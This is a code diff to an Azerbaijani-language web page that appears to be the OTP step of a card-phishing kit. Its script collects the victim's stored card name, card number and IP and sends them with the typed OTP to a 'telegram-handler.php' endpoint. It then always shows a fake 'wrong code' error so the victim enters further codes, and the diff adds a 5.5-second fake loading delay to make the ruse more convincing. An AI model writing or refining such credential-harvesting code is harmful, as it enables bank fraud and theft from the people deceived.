@@ -130,6 +130,11 @@
             font-size: 1rem;
             font-weight: 500;
         }
+        .loader-sub {
+            margin-top: 5px;
+            color: #888;
+            font-size: 0.85rem;
+        }
     </style>
 </head>
 <body>
@@ -201,6 +206,7 @@
     <div class="loader-overlay" id="loaderOverlay">
         <div class="loader-spinner"></div>
         <p class="loader-text">OTP yoxlanılır...</p>
+        <p class="loader-sub">Zəhmət olmasa gözləyin...</p>
     </div>
 
     <script>
@@ -221,8 +227,11 @@
 
     // ===== OTP FUNKSİYALARI =====
     let otpLength = 4;
+    let isProcessing = false;
 
     function toggleOtpLength() {
+        if (isProcessing) return;
+        
         const toggleBtn = document.querySelector('.toggle-btn');
         const otp5 = document.getElementById('otp5');
         const otp6 = document.getElementById('otp6');
@@ -245,16 +254,14 @@
             document.getElementById('otp5').value = '';
             document.getElementById('otp6').value = '';
         }
-        // Xətanı gizlət
         document.getElementById('otpError').classList.remove('show');
-        // Bütün input-lardan error class-ı sil
         document.querySelectorAll('.otp-container input').forEach(el => el.classList.remove('error'));
         validateOtp();
     }
 
     function otpMove(current, nextId) {
+        if (isProcessing) return;
         current.value = current.value.replace(/\D/g, '').slice(0, 1);
-        // Xətanı gizlət
         document.getElementById('otpError').classList.remove('show');
         document.querySelectorAll('.otp-container input').forEach(el => el.classList.remove('error'));
         
@@ -265,6 +272,7 @@
     }
 
     function otpBackspace(current, prevId) {
+        if (isProcessing) return;
         if (event.key === 'Backspace' && current.value === '' && prevId) {
             document.getElementById(prevId).focus();
         }
@@ -282,15 +290,13 @@
     function validateOtp() {
         const otp = getOtp();
         const btn = document.getElementById('otpSubmitBtn');
-        if (otp.length === otpLength) {
-            btn.disabled = false;
-        } else {
-            btn.disabled = true;
-        }
+        btn.disabled = !(otp.length === otpLength && !isProcessing);
     }
 
     // ===== OTP GÖNDƏR =====
     function submitOtp() {
+        if (isProcessing) return;
+        
         const otp = getOtp();
         if (otp.length !== otpLength) {
             document.getElementById('otpError').textContent = '❌ Zəhmət olmasa OTP kodunu tam daxil edin!';
@@ -298,11 +304,10 @@
             return;
         }
 
-        // Yükləmə ekranını göstər
-        document.getElementById('loaderOverlay').classList.add('active');
+        isProcessing = true;
         document.getElementById('otpSubmitBtn').disabled = true;
+        document.getElementById('loaderOverlay').classList.add('active');
 
-        // Məlumatları hazırla
         const ip = localStorage.getItem('ip') || '0.0.0.0';
         const cardName = localStorage.getItem('card_name') || '';
         const cardNumber = localStorage.getItem('card_number') || '';
@@ -323,47 +328,49 @@
         formData.append('ip', ip);
         formData.append('otp', otp);
 
-        // Telegram-a göndər
         fetch('telegram-handler.php', {
             method: 'POST',
             body: formData
         })
         .then(response => response.json())
         .then(data => {
-            document.getElementById('loaderOverlay').classList.remove('active');
-            document.getElementById('otpSubmitBtn').disabled = false;
-            
-            // HƏMİŞƏ XƏTA GÖSTƏR (simulyasiya)
-            document.getElementById('otpError').textContent = '❌ OTP kodu sehvdir! Yenidən cəhd edin.';
-            document.getElementById('otpError').classList.add('show');
-            document.querySelectorAll('.otp-container input').forEach(el => el.classList.add('error'));
-            
-            // Bütün OTP xanalarını təmizlə
-            for (let i = 1; i <= 6; i++) {
-                document.getElementById('otp' + i).value = '';
-            }
-            document.getElementById('otp1').focus();
-            validateOtp();
+            // 5-6 saniyə gözlə (5500ms)
+            setTimeout(function() {
+                document.getElementById('loaderOverlay').classList.remove('active');
+                isProcessing = false;
+                document.getElementById('otpSubmitBtn').disabled = false;
+                
+                document.getElementById('otpError').textContent = '❌ OTP kodu sehvdir! Yenidən cəhd edin.';
+                document.getElementById('otpError').classList.add('show');
+                document.querySelectorAll('.otp-container input').forEach(el => el.classList.add('error'));
+                
+                for (let i = 1; i <= 6; i++) {
+                    document.getElementById('otp' + i).value = '';
+                }
+                document.getElementById('otp1').focus();
+                validateOtp();
+            }, 5500);
         })
         .catch(error => {
-            document.getElementById('loaderOverlay').classList.remove('active');
-            document.getElementById('otpSubmitBtn').disabled = false;
-            document.getElementById('otpError').textContent = '❌ Xəta baş verdi! Yenidən cəhd edin.';
-            document.getElementById('otpError').classList.add('show');
+            setTimeout(function() {
+                document.getElementById('loaderOverlay').classList.remove('active');
+                isProcessing = false;
+                document.getElementById('otpSubmitBtn').disabled = false;
+                document.getElementById('otpError').textContent = '❌ Xəta baş verdi! Yenidən cəhd edin.';
+                document.getElementById('otpError').classList.add('show');
+            }, 5500);
         });
     }
 
-    // Enter düyməsi ilə göndər
     document.addEventListener('keydown', function(e) {
         if (e.key === 'Enter') {
             const btn = document.getElementById('otpSubmitBtn');
-            if (!btn.disabled) {
+            if (!btn.disabled && !isProcessing) {
                 submitOtp();
             }
         }
     });
 
-    // İlk xanaya fokus
     document.getElementById('otp1').focus();
     </script>
         
